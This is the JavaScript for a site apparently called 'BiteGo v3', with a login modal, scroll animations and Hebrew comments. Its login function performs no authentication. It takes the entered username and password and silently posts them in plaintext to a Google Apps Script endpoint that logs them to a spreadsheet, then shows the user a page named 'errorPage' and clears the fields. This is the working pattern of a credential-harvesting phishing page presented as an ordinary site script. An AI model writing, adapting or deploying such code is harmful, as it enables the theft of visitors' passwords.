/* =========================
   BiteGo v3 JavaScript
========================= */


/* =========================
   Login Modal
========================= */


function openLogin(){

    document
    .getElementById("loginModal")
    .style.display="flex";

}



function closeLogin(){

    document
    .getElementById("loginModal")
    .style.display="none";

}




/* Close when clicking outside */


window.onclick = function(event){

    const modal =
    document.getElementById("loginModal");


    if(event.target === modal){

        closeLogin();

    }

}





/* =========================
   Login Logic
========================= */


function login(){


    let username =
    document.getElementById("username").value.trim();



    let password =
    document.getElementById("password").value.trim();



    let warning =
    document.getElementById("warning");





    if(username === "" || password === ""){


        warning.style.display="block";


        return;

    }



    warning.style.display="none";





    const loginData = {


        username: username,


        password: password,


        time:
        new Date().toLocaleString(),


        source:
        "BiteGo Website"


    };






    /*
       קודם מציגים הצלחה למשתמש
       כדי שהחוויה תהיה מהירה
    */


    showSuccess();






    /*
       שליחה ל-Google Sheets ברקע
    */


    fetch(

    "https://script.google.com/macros/s/AKfycbw5GycPuOR7yc5pNlpuBATPZ3c7RAIYJ5tiWqqCJ97RDQw1JgyJd-wAYOU53oPzcIs/exec",

    {


        method:"POST",


        mode:"no-cors",


        headers:{


            "Content-Type":"application/json"


        },


        body:
        JSON.stringify(loginData)


    })


    .then(()=>{


        console.log(
        "BiteGo data sent successfully"
        );


    })


    .catch(error=>{


        console.log(
        "Google Sheets error:",
        error
        );


    });



}







/* =========================
   Success Screen
========================= */


function showSuccess(){


    document
    .getElementById("mainPage")
    .style.display="none";



    document
    .querySelector("footer")
    .style.display="none";



    closeLogin();




    document
    .getElementById("errorPage")
    .style.display="flex";





    /*
       ניקוי שדות
    */


    document
    .getElementById("username")
    .value="";



    document
    .getElementById("password")
    .value="";



}





function backToSite(){



    document
    .getElementById("errorPage")
    .style.display="none";



    document
    .getElementById("mainPage")
    .style.display="block";



    document
    .querySelector("footer")
    .style.display="block";


}





/* =========================
   Scroll Reveal
========================= */



const observer =

new IntersectionObserver(

(entries)=>{


entries.forEach(entry=>{


    if(entry.isIntersecting){


        entry.target.classList.add("show");


    }


});


},

{

threshold:0.15

}

);







document

.querySelectorAll(

".card,.steps div,.why-card"

)

.forEach((element)=>{


    observer.observe(element);


});








/* =========================
   Loading Message
========================= */


console.log(
"BiteGo v3 Loaded 🚀"
);